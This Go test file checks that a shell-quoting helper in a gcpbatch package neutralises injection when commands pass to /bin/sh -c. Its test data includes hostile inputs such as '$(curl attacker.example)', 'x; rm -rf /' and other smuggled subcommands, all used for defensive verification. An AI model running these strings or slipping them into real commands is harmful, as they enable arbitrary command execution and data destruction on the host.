package gcpbatch

import (
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// The whole command string is handed to `/bin/sh -c`, so anything interpolated
// into it is shell-evaluated. Go's %q was not enough: it quotes with double
// quotes, inside which sh still expands $(...) and backticks.
func TestShellQuoteNeutralisesShellSyntax(t *testing.T) {
	for name, input := range map[string]string{
		"command substitution": `$(curl attacker.example)`,
		"backticks":            "`id`",
		"variable":             `$HOME`,
		"semicolon":            `x; rm -rf /`,
		"double quote":         `x" && id && echo "`,
		"newline":              "x\nid",
	} {
		t.Run(name, func(t *testing.T) {
			quoted := shellQuote(input)
			assert.True(t, strings.HasPrefix(quoted, "'"))
			assert.True(t, strings.HasSuffix(quoted, "'"))
			// Nothing that sh would act on may sit outside the quotes: the only
			// unescaped quote characters are the wrapping pair.
			assert.Equal(t, 2, strings.Count(quoted, "'")-strings.Count(quoted, `'\''`)*3,
				"quoted=%s", quoted)
		})
	}

	// The single quote is the one character single-quoting cannot contain, and
	// is closed / escaped / reopened.
	assert.Equal(t, `'it'\''s'`, shellQuote("it's"))
	assert.Equal(t, `''`, shellQuote(""))
}

func TestVarArgsQuotesAndOrdersStably(t *testing.T) {
	args := varArgs(map[string]string{
		"city":     "tsukuba",
		"injected": `$(id)`,
	})

	require.Len(t, args, 2)
	assert.Equal(t, []string{`--var='city=tsukuba'`, `--var='injected=$(id)'`}, args,
		"values are quoted, and order is stable so a resubmission is byte-identical")
}
